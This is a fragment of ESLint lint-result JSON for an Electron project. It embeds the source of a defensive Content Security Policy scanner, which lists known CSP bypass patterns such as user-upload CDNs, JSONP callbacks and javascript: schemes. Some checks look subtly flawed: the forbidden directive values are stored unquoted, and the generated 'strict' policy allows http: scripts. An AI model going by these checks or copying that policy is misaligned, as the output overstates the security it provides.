block.","line":193,"column":9,"nodeType":"VariableDeclaration","messageId":"unexpected","endLine":193,"endColumn":19,"suggestions":[{"messageId":"addBrackets","fix":{"range":[5011,5242],"text":"{ const metaRegex = /<meta[^>]*http-equiv=\"Content-Security-Policy\"[^>]*content=\"([^\"]+)\"/gi;\n        let match;\n        while ((match = metaRegex.exec(content)) !== null) {\n          policies.push(match[1]);\n        }\n        break; }"},"desc":"Add {} brackets around the case block."}]},{"ruleId":"no-case-declarations","severity":2,"message":"Unexpected lexical declaration in case block.","line":201,"column":9,"nodeType":"VariableDeclaration","messageId":"unexpected","endLine":201,"endColumn":77,"suggestions":[{"messageId":"addBrackets","fix":{"range":[5345,5900],"text":"{ const cspRegex = /contentSecurityPolicy\\s*:\\s*[\"'`]([^\"'`]+)[\"'`]/g;\n        let electronMatch;\n        while ((electronMatch = cspRegex.exec(content)) !== null) {\n          policies.push(electronMatch[1]);\n        }\n        \n        // Also check for session.defaultSession.webRequest patterns\n        const sessionRegex = /setResponseHeader.*Content-Security-Policy.*[\"'`]([^\"'`]+)[\"'`]/g;\n        let sessionMatch;\n        while ((sessionMatch = sessionRegex.exec(content)) !== null) {\n          policies.push(sessionMatch[1]);\n        }\n        break; }"},"desc":"Add {} brackets around the case block."}]},{"ruleId":"no-case-declarations","severity":2,"message":"Unexpected lexical declaration in case block.","line":202,"column":9,"nodeType":"VariableDeclaration","messageId":"unexpected","endLine":202,"endColumn":27,"suggestions":[{"messageId":"addBrackets","fix":{"range":[5345,5900],"text":"{ const cspRegex = /contentSecurityPolicy\\s*:\\s*[\"'`]([^\"'`]+)[\"'`]/g;\n        let electronMatch;\n        while ((electronMatch = cspRegex.exec(content)) !== null) {\n          policies.push(electronMatch[1]);\n        }\n        \n        // Also check for session.defaultSession.webRequest patterns\n        const sessionRegex = /setResponseHeader.*Content-Security-Policy.*[\"'`]([^\"'`]+)[\"'`]/g;\n        let sessionMatch;\n        while ((sessionMatch = sessionRegex.exec(content)) !== null) {\n          policies.push(sessionMatch[1]);\n        }\n        break; }"},"desc":"Add {} brackets around the case block."}]},{"ruleId":"no-case-declarations","severity":2,"message":"Unexpected lexical declaration in case block.","line":208,"column":9,"nodeType":"VariableDeclaration","messageId":"unexpected","endLine":208,"endColumn":97,"suggestions":[{"messageId":"addBrackets","fix":{"range":[5345,5900],"text":"{ const cspRegex = /contentSecurityPolicy\\s*:\\s*[\"'`]([^\"'`]+)[\"'`]/g;\n        let electronMatch;\n        while ((electronMatch = cspRegex.exec(content)) !== null) {\n          policies.push(electronMatch[1]);\n        }\n        \n        // Also check for session.defaultSession.webRequest patterns\n        const sessionRegex = /setResponseHeader.*Content-Security-Policy.*[\"'`]([^\"'`]+)[\"'`]/g;\n        let sessionMatch;\n        while ((sessionMatch = sessionRegex.exec(content)) !== null) {\n          policies.push(sessionMatch[1]);\n        }\n        break; }"},"desc":"Add {} brackets around the case block."}]},{"ruleId":"no-case-declarations","severity":2,"message":"Unexpected lexical declaration in case block.","line":209,"column":9,"nodeType":"VariableDeclaration","messageId":"unexpected","endLine":209,"endColumn":26,"suggestions":[{"messageId":"addBrackets","fix":{"range":[5345,5900],"text":"{ const cspRegex = /contentSecurityPolicy\\s*:\\s*[\"'`]([^\"'`]+)[\"'`]/g;\n        let electronMatch;\n        while ((electronMatch = cspRegex.exec(content)) !== null) {\n          policies.push(electronMatch[1]);\n        }\n        \n        // Also check for session.defaultSession.webRequest patterns\n        const sessionRegex = /setResponseHeader.*Content-Security-Policy.*[\"'`]([^\"'`]+)[\"'`]/g;\n        let sessionMatch;\n        while ((sessionMatch = sessionRegex.exec(content)) !== null) {\n          policies.push(sessionMatch[1]);\n        }\n        break; }"},"desc":"Add {} brackets around the case block."}]}],"suppressedMessages":[],"errorCount":6,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Content Security Policy (CSP) Testing for Electron Applications\n * \n * Following 2025 best practices:\n * - Strict CSP with nonces\n * - Testing for common bypass vulnerabilities\n * - JSONP endpoint detection\n * - Unsafe directive detection\n * - Compliance with security standards\n */\n\nconst fs = require('fs').promises;\nconst path = require('path');\nconst { parse } = require('csp-parse');\nconst crypto = require('crypto');\n\n// CSP Security Requirements for Electron 2025\nconst CSP_REQUIREMENTS = {\n  // Required directives\n  required: [\n    'default-src',\n    'script-src',\n    'style-src',\n    'img-src',\n    'connect-src',\n    'font-src',\n    'object-src',\n    'frame-ancestors'\n  ],\n  \n  // Forbidden unsafe directives\n  forbidden: {\n    'script-src': ['unsafe-inline', 'unsafe-eval'],\n    'style-src': ['unsafe-inline'],\n    'default-src': ['*', 'data:', 'blob:']\n  },\n  \n  // Recommended strict values\n  recommended: {\n    'default-src': [\"'self'\"],\n    'script-src': [\"'self'\", \"'nonce-'\", \"'strict-dynamic'\"],\n    'style-src': [\"'self'\", \"'nonce-'\"],\n    'img-src': [\"'self'\", \"data:\", \"https:\"],\n    'connect-src': [\"'self'\", \"wss:\", \"https:\"],\n    'font-src': [\"'self'\"],\n    'object-src': [\"'none'\"],\n    'frame-ancestors': [\"'none'\"],\n    'base-uri': [\"'self'\"],\n    'form-action': [\"'self'\"]\n  },\n  \n  // Known bypass patterns\n  bypassPatterns: [\n    // CDNs that allow user uploads\n    'cdnjs.cloudflare.com',\n    'unpkg.com',\n    'jsdelivr.net',\n    'raw.githubusercontent.com',\n    \n    // JSONP endpoints\n    'callback=',\n    'jsonp=',\n    '.json?',\n    'api.*callback',\n    \n    // Unsafe schemes\n    'filesystem:',\n    'blob:',\n    'data:text/html',\n    'javascript:'\n  ]\n};\n\nclass CSPSecurityTester {\n  constructor() {\n    this.results = {\n      passed: true,\n      violations: [],\n      warnings: [],\n      info: [],\n      cspPolicies: [],\n      score: 100,\n      compliance: {\n        owaspTop10: true,\n        electronSecurity: true,\n        strictCSP: false\n      }\n    };\n  }\n\n  async run(projectRoot = process.cwd()) {\n    console.log('ðŸ”’ Starting CSP Security Testing for Electron App...\\n');\n    \n    try {\n      // 1. Find and analyze CSP configurations\n      await this.findCSPConfigurations(projectRoot);\n      \n      // 2. Analyze each CSP policy\n      for (const policy of this.results.cspPolicies) {\n        await this.analyzeCSP(policy);\n      }\n      \n      // 3. Test for Electron-specific CSP issues\n      await this.testElectronCSP(projectRoot);\n      \n      // 4. Check for bypass vulnerabilities\n      await this.checkBypassVulnerabilities();\n      \n      // 5. Generate compliance report\n      this.generateComplianceReport();\n      \n      // 6. Calculate final score\n      this.calculateScore();\n      \n      // 7. Generate reports\n      await this.generateReports(projectRoot);\n      \n      // Print summary\n      this.printSummary();\n      \n      return this.results.passed;\n    } catch (error) {\n      console.error('âŒ CSP testing failed:', error.message);\n      return false;\n    }\n  }\n\n  /**\n   * Find CSP configurations in the project\n   */\n  async findCSPConfigurations(projectRoot) {\n    console.log('ðŸ” Searching for CSP configurations...');\n    \n    const cspLocations = [\n      // HTML files\n      { pattern: '**/*.html', type: 'html' },\n      // JavaScript files (BrowserWindow configurations)\n      { pattern: '**/main*.{js,ts}', type: 'electron-main' },\n      { pattern: '**/preload*.{js,ts}', type: 'electron-preload' },\n      // Configuration files\n      { pattern: '**/csp.config.{js,json}', type: 'config' },\n      { pattern: '**/security.config.{js,json}', type: 'config' }\n    ];\n    \n    for (const location of cspLocations) {\n      await this.searchForCSP(projectRoot, location);\n    }\n    \n    if (this.results.cspPolicies.length === 0) {\n      this.results.violations.push({\n        severity: 'critical',\n        message: 'No Content Security Policy found',\n        recommendation: 'Implement a strict CSP to protect against XSS attacks'\n      });\n      this.results.passed = false;\n    }\n    \n    console.log(`Found ${this.results.cspPolicies.length} CSP configurations\\n`);\n  }\n\n  async searchForCSP(projectRoot, location) {\n    const glob = require('glob');\n    const files = glob.sync(location.pattern, {\n      cwd: projectRoot,\n      ignore: ['**/node_modules/**', '**/dist/**', '**/build/**']\n    });\n    \n    for (const file of files) {\n      const filePath = path.join(projectRoot, file);\n      const content = await fs.readFile(filePath, 'utf8');\n      \n      // Extract CSP based on file type\n      const policies = this.extractCSP(content, location.type);\n      \n      policies.forEach(policy => {\n        this.results.cspPolicies.push({\n          file: file,\n          type: location.type,\n          policy: policy,\n          parsed: this.parseCSP(policy)\n        });\n      });\n    }\n  }\n\n  extractCSP(content, type) {\n    const policies = [];\n    \n    switch (type) {\n      case 'html':\n        // Look for meta tags\n        const metaRegex = /<meta[^>]*http-equiv=\"Content-Security-Policy\"[^>]*content=\"([^\"]+)\"/gi;\n        let match;\n        while ((match = metaRegex.exec(content)) !== null) {\n          policies.push(match[1]);\n        }\n        break;\n        \n      case 'electron-main':\n        // Look for webPreferences.contentSecurityPolicy\n        const cspRegex = /contentSecurityPolicy\\s*:\\s*[\"'`]([^\"'`]+)[\"'`]/g;\n        let electronMatch;\n        while ((electronMatch = cspRegex.exec(content)) !== null) {\n          policies.push(electronMatch[1]);\n        }\n        \n        // Also check for session.defaultSession.webRequest patterns\n        const sessionRegex = /setResponseHeader.*Content-Security-Policy.*[\"'`]([^\"'`]+)[\"'`]/g;\n        let sessionMatch;\n        while ((sessionMatch = sessionRegex.exec(content)) !== null) {\n          policies.push(sessionMatch[1]);\n        }\n        break;\n        \n      case 'config':\n        // Try to parse as JSON or JS module\n        try {\n          const configData = JSON.parse(content);\n          if (configData.csp) policies.push(configData.csp);\n          if (configData.contentSecurityPolicy) policies.push(configData.contentSecurityPolicy);\n        } catch {\n          // Not JSON, try regex for JS exports\n          const exportRegex = /(?:export\\s+(?:default\\s+)?|module\\.exports\\s*=\\s*).*csp['\"]\\s*:\\s*[\"'`]([^\"'`]+)[\"'`]/g;\n          let exportMatch;\n          while ((exportMatch = exportRegex.exec(content)) !== null) {\n            policies.push(exportMatch[1]);\n          }\n        }\n        break;\n    }\n    \n    return policies;\n  }\n\n  parseCSP(policyString) {\n    try {\n      return parse(policyString);\n    } catch {\n      // Fallback to manual parsing\n      const directives = {};\n      const parts = policyString.split(';').map(p => p.trim()).filter(Boolean);\n      \n      parts.forEach(part => {\n        const [directive, ...values] = part.split(/\\s+/);\n        if (directive) {\n          directives[directive] = values;\n        }\n      });\n      \n      return directives;\n    }\n  }\n\n  /**\n   * Analyze a CSP policy for security issues\n   */\n  async analyzeCSP(policyConfig) {\n    console.log(`ðŸ“‹ Analyzing CSP from ${policyConfig.file}...`);\n    \n    const { parsed } = policyConfig;\n    \n    // Check for required directives\n    CSP_REQUIREMENTS.required.forEach(directive => {\n      if (!parsed[directive]) {\n        this.results.violations.push({\n          severity: 'high',\n          file: policyConfig.file,\n          message: `Missing required directive: ${directive}`,\n          recommendation: `Add ${directive} with restrictive values`\n        });\n      }\n    });\n    \n    // Check for forbidden values\n    Object.entries(CSP_REQUIREMENTS.forbidden).forEach(([directive, forbidden]) => {\n      const values = parsed[directive] || [];\n      forbidden.forEach(forbiddenValue => {\n        if (values.includes(forbiddenValue)) {\n          this.results.violations.push({\n            severity: 'critical',\n            file: policyConfig.file,\n            message: `Unsafe directive found: ${directive} contains '${forbiddenValue}'`,\n            recommendation: `Remove '${forbiddenValue}' and use nonces or 'strict-dynamic' instead`\n          });\n          this.results.passed = false;\n        }\n      });\n    });\n    \n    // Check for overly permissive policies\n    this.checkPermissivePolicies(parsed, policyConfig.file);\n    \n    // Check for nonce implementation\n    this.checkNonceImplementation(parsed, policyConfig.file);\n    \n    // Check for recommended values\n    this.checkRecommendedValues(parsed, policyConfig.file);\n  }\n\n  checkPermissivePolicies(parsed, file) {\n    // Check for wildcard in critical directives\n    const criticalDirectives = ['default-src', 'script-src', 'style-src', 'connect-src'];\n    \n    criticalDirectives.forEach(directive => {\n      const values = parsed[directive] || [];\n      \n      // Check for wildcards\n      if (values.includes('*') || values.some(v => v.includes('*') && !v.includes('.'))) {\n        this.results.violations.push({\n          severity: 'high',\n          file,\n          message: `Overly permissive ${directive} with wildcard`,\n          recommendation: 'Specify exact domains instead of wildcards'\n        });\n      }\n      \n      // Check for http:// (should be https://)\n      if (values.some(v => v.startsWith('http://'))) {\n        this.results.warnings.push({\n          severity: 'medium',\n          file,\n          message: `Insecure HTTP protocol in ${directive}`,\n          recommendation: 'Use HTTPS for all external resources'\n        });\n      }\n    });\n  }\n\n  checkNonceImplementation(parsed, file) {\n    const scriptSrc = parsed['script-src'] || [];\n    const styleSrc = parsed['style-src'] || [];\n    \n    const hasScriptNonce = scriptSrc.some(v => v.includes(\"'nonce-\"));\n    const hasStyleNonce = styleSrc.some(v => v.includes(\"'nonce-\"));\n    \n    if (!hasScriptNonce && !scriptSrc.includes(\"'strict-dynamic'\")) {\n      this.results.warnings.push({\n        severity: 'medium',\n        file,\n        message: 'No nonce or strict-dynamic for script-src',\n        recommendation: 'Implement nonce-based CSP for better security'\n      });\n    }\n    \n    if (!hasStyleNonce && styleSrc.includes(\"'unsafe-inline'\")) {\n      this.results.warnings.push({\n        severity: 'medium',\n        file,\n        message: 'Style-src uses unsafe-inline without nonces',\n        recommendation: 'Implement nonce-based styles or external stylesheets'\n      });\n    }\n  }\n\n  checkRecommendedValues(parsed, file) {\n    Object.entries(CSP_REQUIREMENTS.recommended).forEach(([directive, recommended]) => {\n      const actual = parsed[directive] || [];\n      \n      // Check if directive follows recommendations\n      const followsRecommendation = recommended.every(rec => \n        rec.includes('nonce') || actual.includes(rec)\n      );\n      \n      if (!followsRecommendation && actual.length > 0) {\n        this.results.info.push({\n          file,\n          message: `${directive} could be more restrictive`,\n          recommendation: `Consider using: ${directive} ${recommended.join(' ')}`\n        });\n      }\n    });\n  }\n\n  /**\n   * Test Electron-specific CSP issues\n   */\n  async testElectronCSP(projectRoot) {\n    console.log('ðŸ”Œ Testing Electron-specific CSP configurations...\\n');\n    \n    // Find main process files\n    const mainFiles = require('glob').sync('**/main*.{js,ts}', {\n      cwd: projectRoot,\n      ignore: ['**/node_modules/**', '**/dist/**']\n    });\n    \n    for (const file of mainFiles) {\n      const content = await fs.readFile(path.join(projectRoot, file), 'utf8');\n      \n      // Check for missing CSP in BrowserWindow\n      if (content.includes('new BrowserWindow') && !content.includes('contentSecurityPolicy')) {\n        this.results.warnings.push({\n          severity: 'high',\n          file,\n          message: 'BrowserWindow created without explicit CSP',\n          recommendation: 'Set contentSecurityPolicy in webPreferences'\n        });\n      }\n      \n      // Check for webSecurity disabled\n      if (content.includes('webSecurity: false') || content.includes('webSecurity:false')) {\n        this.results.violations.push({\n          severity: 'critical',\n          file,\n          message: 'webSecurity is disabled',\n          recommendation: 'Never disable webSecurity in production'\n        });\n        this.results.passed = false;\n      }\n      \n      // Check for allowRunningInsecureContent\n      if (content.includes('allowRunningInsecureContent: true')) {\n        this.results.violations.push({\n          severity: 'high',\n          file,\n          message: 'allowRunningInsecureContent is enabled',\n          recommendation: 'Disable allowRunningInsecureContent'\n        });\n      }\n    }\n  }\n\n  /**\n   * Check for CSP bypass vulnerabilities\n   */\n  async checkBypassVulnerabilities() {\n    console.log('ðŸ” Checking for CSP bypass vulnerabilities...\\n');\n    \n    for (const policy of this.results.cspPolicies) {\n      const { parsed, file } = policy;\n      \n      // Check each directive for bypass patterns\n      Object.entries(parsed).forEach(([directive, values]) => {\n        values.forEach(value => {\n          CSP_REQUIREMENTS.bypassPatterns.forEach(pattern => {\n            if (value.includes(pattern)) {\n              this.results.violations.push({\n                severity: 'high',\n                file,\n                message: `Potential CSP bypass: ${directive} includes '${pattern}'`,\n                recommendation: 'Remove or restrict access to user-controllable endpoints'\n              });\n            }\n          });\n        });\n      });\n      \n      // Check for JSONP endpoints\n      const scriptSrc = parsed['script-src'] || [];\n      const connectSrc = parsed['connect-src'] || [];\n      \n      [...scriptSrc, ...connectSrc].forEach(src => {\n        if (src.includes('cdn') || src.includes('api')) {\n          this.results.warnings.push({\n            severity: 'medium',\n            file,\n            message: `External API/CDN in CSP: ${src}`,\n            recommendation: 'Verify that endpoints cannot serve user-controlled content'\n          });\n        }\n      });\n    }\n  }\n\n  /**\n   * Generate compliance report\n   */\n  generateComplianceReport() {\n    // Check OWASP Top 10 compliance\n    this.results.compliance.owaspTop10 = \n      !this.results.violations.some(v => v.severity === 'critical') &&\n      this.results.cspPolicies.length > 0;\n    \n    // Check Electron security compliance\n    this.results.compliance.electronSecurity = \n      !this.results.violations.some(v => \n        v.message.includes('webSecurity') || \n        v.message.includes('allowRunningInsecureContent')\n      );\n    \n    // Check strict CSP compliance\n    this.results.compliance.strictCSP = \n      this.results.cspPolicies.some(p => {\n        const parsed = p.parsed;\n        return (\n          parsed['script-src']?.includes(\"'strict-dynamic'\") ||\n          parsed['script-src']?.some(v => v.includes(\"'nonce-\"))\n        );\n      });\n  }\n\n  /**\n   * Calculate security score\n   */\n  calculateScore() {\n    let score = 100;\n    \n    // Deduct points for violations\n    this.results.violations.forEach(violation => {\n      switch (violation.severity) {\n        case 'critical': score -= 25; break;\n        case 'high': score -= 15; break;\n        case 'medium': score -= 10; break;\n        case 'low': score -= 5; break;\n      }\n    });\n    \n    // Deduct points for warnings\n    this.results.warnings.forEach(() => {\n      score -= 3;\n    });\n    \n    // Bonus points for strict CSP\n    if (this.results.compliance.strictCSP) {\n      score += 10;\n    }\n    \n    this.results.score = Math.max(0, Math.min(100, score));\n    this.results.passed = this.results.score >= 70 && \n                          !this.results.violations.some(v => v.severity === 'critical');\n  }\n\n  /**\n   * Generate reports\n   */\n  async generateReports(projectRoot) {\n    const outputDir = path.join(projectRoot, 'test-results', 'security');\n    await fs.mkdir(outputDir, { recursive: true });\n    \n    // JSON report\n    const jsonPath = path.join(outputDir, 'csp-security-report.json');\n    await fs.writeFile(jsonPath, JSON.stringify(this.results, null, 2));\n    \n    // HTML report\n    const htmlPath = path.join(outputDir, 'csp-security-report.html');\n    await fs.writeFile(htmlPath, this.generateHTMLReport());\n    \n    // Generate CSP recommendation\n    const recommendedCSP = this.generateRecommendedCSP();\n    const cspPath = path.join(outputDir, 'recommended-csp.txt');\n    await fs.writeFile(cspPath, recommendedCSP);\n    \n    console.log('ðŸ“„ Reports generated:');\n    console.log(`   - JSON: ${jsonPath}`);\n    console.log(`   - HTML: ${htmlPath}`);\n    console.log(`   - Recommended CSP: ${cspPath}\\n`);\n  }\n\n  generateHTMLReport() {\n    return `\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <title>CSP Security Report</title>\n  <style>\n    body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }\n    .header { background: #1a1a1a; color: white; padding: 20px; border-radius: 8px; }\n    .score { font-size: 48px; font-weight: bold; color: ${this.results.score >= 70 ? '#10b981' : '#ef4444'}; }\n    .section { background: white; padding: 20px; margin: 20px 0; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }\n    .violation { border-left: 4px solid #ef4444; padding: 10px; margin: 10px 0; background: #fef2f2; }\n    .warning { border-left: 4px solid #f59e0b; padding: 10px; margin: 10px 0; background: #fffbeb; }\n    .info { border-left: 4px solid #3b82f6; padding: 10px; margin: 10px 0; background: #eff6ff; }\n    .critical { color: #dc2626; font-weight: bold; }\n    .high { color: #ea580c; font-weight: bold; }\n    .medium { color: #f59e0b; }\n    .compliance { display: flex; gap: 20px; }\n    .compliance-item { padding: 10px 20px; border-radius: 4px; }\n    .pass { background: #10b981; color: white; }\n    .fail { background: #ef4444; color: white; }\n  </style>\n</head>\n<body>\n  <div class=\"header\">\n    <h1>Content Security Policy Security Report</h1>\n    <div class=\"score\">Score: ${this.results.score}/100</div>\n    <p>Generated on ${new Date().toLocaleString()}</p>\n  </div>\n\n  <div class=\"section\">\n    <h2>Compliance Status</h2>\n    <div class=\"compliance\">\n      <div class=\"compliance-item ${this.results.compliance.owaspTop10 ? 'pass' : 'fail'}\">\n        OWASP Top 10: ${this.results.compliance.owaspTop10 ? 'PASS' : 'FAIL'}\n      </div>\n      <div class=\"compliance-item ${this.results.compliance.electronSecurity ? 'pass' : 'fail'}\">\n        Electron Security: ${this.results.compliance.electronSecurity ? 'PASS' : 'FAIL'}\n      </div>\n      <div class=\"compliance-item ${this.results.compliance.strictCSP ? 'pass' : 'fail'}\">\n        Strict CSP: ${this.results.compliance.strictCSP ? 'PASS' : 'FAIL'}\n      </div>\n    </div>\n  </div>\n\n  <div class=\"section\">\n    <h2>Violations (${this.results.violations.length})</h2>\n    ${this.results.violations.map(v => `\n      <div class=\"violation\">\n        <div class=\"${v.severity}\">${v.severity.toUpperCase()}: ${v.message}</div>\n        <div>File: ${v.file || 'N/A'}</div>\n        <div>Recommendation: ${v.recommendation}</div>\n      </div>\n    `).join('')}\n  </div>\n\n  <div class=\"section\">\n    <h2>Warnings (${this.results.warnings.length})</h2>\n    ${this.results.warnings.map(w => `\n      <div class=\"warning\">\n        <div class=\"${w.severity}\">${w.message}</div>\n        <div>File: ${w.file || 'N/A'}</div>\n        <div>Recommendation: ${w.recommendation}</div>\n      </div>\n    `).join('')}\n  </div>\n\n  <div class=\"section\">\n    <h2>CSP Policies Found</h2>\n    ${this.results.cspPolicies.map(p => `\n      <div class=\"info\">\n        <strong>File:</strong> ${p.file}<br>\n        <strong>Type:</strong> ${p.type}<br>\n        <strong>Policy:</strong> <code>${p.policy}</code>\n      </div>\n    `).join('')}\n  </div>\n</body>\n</html>\n    `;\n  }\n\n  generateRecommendedCSP() {\n    const nonce = crypto.randomBytes(16).toString('base64');\n    \n    return `# Recommended Strict Content Security Policy for Electron Apps (2025)\n\n# Basic strict CSP with nonces\ndefault-src 'self';\nscript-src 'self' 'nonce-${nonce}' 'strict-dynamic' https: http:;\nstyle-src 'self' 'nonce-${nonce}';\nimg-src 'self' data: https:;\nfont-src 'self';\nconnect-src 'self' wss: https:;\nmedia-src 'self';\nobject-src 'none';\nframe-ancestors 'none';\nbase-uri 'self';\nform-action 'self';\nupgrade-insecure-requests;\n\n# For Electron main process (in webPreferences):\nwebPreferences: {\n  contextIsolation: true,\n  nodeIntegration: false,\n  webSecurity: true,\n  allowRunningInsecureContent: false,\n  contentSecurityPolicy: \"default-src 'self'; script-src 'self' 'nonce-GENERATED_NONCE' 'strict-dynamic'; style-src 'self' 'nonce-GENERATED_NONCE'; img-src 'self' data: https:; font-src 'self'; connect-src 'self' wss: https:; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self';\"\n}\n\n# Implementation notes:\n1. Generate a new nonce for each page load\n2. Add nonce attribute to all inline scripts and styles\n3. Use 'strict-dynamic' to allow dynamically created scripts\n4. Never use 'unsafe-inline' or 'unsafe-eval'\n5. Restrict connect-src to specific API endpoints\n6. Use HTTPS for all external resources\n7. Implement CSP reporting: report-uri /csp-violation-report-endpoint/\n`;\n  }\n\n  /**\n   * Print summary to console\n   */\n  printSummary() {\n    console.log('\\nðŸ“Š CSP Security Test Summary:');\n    console.log('â”'.repeat(50));\n    console.log(`   Security Score: ${this.results.score}/100`);\n    console.log(`   Status: ${this.results.passed ? 'âœ… PASSED' : 'âŒ FAILED'}`);\n    console.log(`   Policies Found: ${this.results.cspPolicies.length}`);\n    console.log(`   Violations: ${this.results.violations.length}`);\n    console.log(`   Warnings: ${this.results.warnings.length}`);\n    console.log('â”'.repeat(50));\n    \n    if (!this.results.passed) {\n      console.log('\\nâŒ Critical issues found:');\n      this.results.violations\n        .filter(v => v.severity === 'critical')\n        .forEach(v => console.log(`   - ${v.message}`));\n    }\n  }\n}\n\n// Main execution\nasync function main() {\n  const tester = new CSPSecurityTester();\n  const passed = await tester.run();\n  \n  process.exit(passed ? 0 : 1);\n}\n\n// Run if called directly\nif (require.main === module) {\n  main().catch(error => {\n    console.error('Fatal error:', error);\n    process.exit(1);\n  });\n}\n\nmodule.exports = { CSPSecurityTester, CSP_REQUIREMENTS };","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/scripts/dependency-vulnerability-scan.js","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/scripts/performance-monitor.js","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/scripts/scripts/csp-security-test.js","messages":[{"ruleId":"no-case-declarations","severity":2,"message":"Unexpected lexical declaration in case block.","line":192,"column":9,"nodeType":"VariableDeclaration","messageId":"unexpected","endLine":192,"endColumn":100,"suggestions":[{"messageId":"addBrackets","fix":{"range":[5011,5242],"text":"{ const metaRegex = /<meta[^>]*http-equiv=\"Content-Security-Policy\"[^>]*content=\"([^\"]+)\"/gi;\n        let match;\n        while ((match = metaRegex.exec(content)) !== null) {\n          policies.push(match[1]);\n        }\n        break; }"},"desc":"Add {} brackets around the case block."}]},{"ruleId":"no-case-declarations","severity":2,"message":"Unexpected lexical declaration in case block.","line":193,"column":9,"nodeType":"VariableDeclaration","messageId":"unexpected","endLine":193,"endColumn":19,"suggestions":[{"messageId":"addBrackets","fix":{"range":[5011,5242],"text":"{ const metaRegex = /<meta[^>]*http-equiv=\"Content-Security-Policy\"[^>]*content=\"([^\"]+)\"/gi;\n        let match;\n        while ((match = metaRegex.exec(content)) !== null) {\n          policies.push(match[1]);\n        }\n        break; }"},"desc":"Add {} brackets around the case block."}]},{"ruleId":"no-case-declarations","severity":2,"message":"Unexpected lexical declaration in case block.","line":201,"column":9,"nodeType":"VariableDeclaration","messageId":"unexpected","endLine":201,"endColumn":77,"suggestions":[{"messageId":"addBrackets","fix":{"range":[5345,5900],"text":"{ const cspRegex = /contentSecurityPolicy\\s*:\\s*[\"'`]([^\"'`]+)[\"'`]/g;\n        let electronMatch;\n        while ((electronMatch = cspRegex.exec(content)) !== null) {\n          policies.push(electronMatch[1]);\n        }\n        \n        // Also check for session.defaultSession.webRequest patterns\n        const sessionRegex = /setResponseHeader.*Content-Security-Policy.*[\"'`]([^\"'`]+)[\"'`]/g;\n        let sessionMatch;\n        while ((sessionMatch = sessionRegex.exec(content)) !== null) {\n          policies.push(sessionMatch[1]);\n        }\n        break; }"},"desc":"Add {} brackets around the case block."}]},{"ruleId":"no-case-declarations","severity":2,"message":"Unexpected lexical declaration in case block.","line":202,"column":9,"nodeType":"VariableDeclaration","messageId":"unexpected","endLine":202,"endColumn":27,"suggestions":[{"messageId":"addBrackets","fix":{"range":[5345,5900],"text":"{ const cspRegex = /contentSecurityPolicy\\s*:\\s*[\"'`]([^\"'`]+)[\"'`]/g;\n        let electronMatch;\n        while ((electronMatch = cspRegex.exec(content)) !== null) {\n          policies.push(electronMatch[1]);\n        }\n        \n        // Also check for session.defaultSession.webRequest patterns\n        const sessionRegex = /setResponseHeader.*Content-Security-Policy.*[\"'`]([^\"'`]+)[\"'`]/g;\n        let sessionMatch;\n        while ((sessionMatch = sessionRegex.exec(content)) !== null) {\n          policies.push(sessionMatch[1]);\n        }\n        break; }"},"desc":"Add {} brackets around the case block."}]},{"ruleId":"no-case-declarations","severity":2,"message":"Unexpected lexical declaration in case block.","line":208,"column":9,"nodeType":"VariableDeclaration","messageId":"unexpected","endLine":208,"endColumn":97,"suggestions":[{"messageId":"addBrackets","fix":{"range":[5345,5900],"text":"{ const cspRegex = /contentSecurityPolicy\\s*:\\s*[\"'`]([^\"'`]+)[\"'`]/g;\n        let electronMatch;\n        while ((electronMatch = cspRegex.exec(content)) !== null) {\n          policies.push(electronMatch[1]);\n        }\n        \n        // Also check for session.defaultSession.webRequest patterns\n        const sessionRegex = /setResponseHeader.*Content-Security-Policy.*[\"'`]([^\"'`]+)[\"'`]/g;\n        let sessionMatch;\n        while ((sessionMatch = sessionRegex.exec(content)) !== null) {\n          policies.push(sessionMatch[1]);\n        }\n        break; }"},"desc":"Add {} brackets around the case block."}]},{"ruleId":"no-case-declarations","severity":2,"message":"Unexpected lexical declaration in case block.","line":209,"column":9,"nodeType":"VariableDeclaration","messageId":"unexpected","endLine":209,"endColumn":26,"suggestions":[{"messageId":"addBrackets","fix":{"range":[5345,5900],"text":"{ const cspRegex = /contentSecurityPolicy\\s*:\\s*[\"'`]([^\"'`]+)[\"'`]/g;\n        let electronMatch;\n        while ((electronMatch = cspRegex.exec(content)) !== null) {\n          policies.push(electronMatch[1]);\n        }\n        \n        // Also check for session.defaultSession.webRequest patterns\n        const sessionRegex = /setResponseHeader.*Content-Security-Policy.*[\"'`]([^\"'`]+)[\"'`]/g;\n        let sessionMatch;\n        while ((sessionMatch = sessionRegex.exec(content)) !== null) {\n          policies.push(sessionMatch[1]);\n        }\n        break; }"},"desc":"Add {} brackets around the case block."}]},{"ruleId":"@typescript-eslint/no-unused-vars","severity":2,"message":"'warning' is defined but never used.","line":508,"column":35,"nodeType":null,"messageId":"unusedVar","endLine":508,"endColumn":42}],"suppressedMessages":[],"errorCount":7,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Content Security Policy (CSP) Testing for Electron Applications\n * \n * Following 2025 best practices:\n * - Strict CSP with nonces\n * - Testing for common bypass vulnerabilities\n * - JSONP endpoint detection\n * - Unsafe directive detection\n * - Compliance with security standards\n */\n\nconst fs = require('fs').promises;\nconst path = require('path');\nconst { parse } = require('csp-parse');\nconst crypto = require('crypto');\n\n// CSP Security Requirements for Electron 2025\nconst CSP_REQUIREMENTS = {\n  // Required directives\n  required: [\n    'default-src',\n    'script-src',\n    'style-src',\n    'img-src',\n    'connect-src',\n    'font-src',\n    'object-src',\n    'frame-ancestors'\n  ],\n  \n  // Forbidden unsafe directives\n  forbidden: {\n    'script-src': ['unsafe-inline', 'unsafe-eval'],\n    'style-src': ['unsafe-inline'],\n    'default-src': ['*', 'data:', 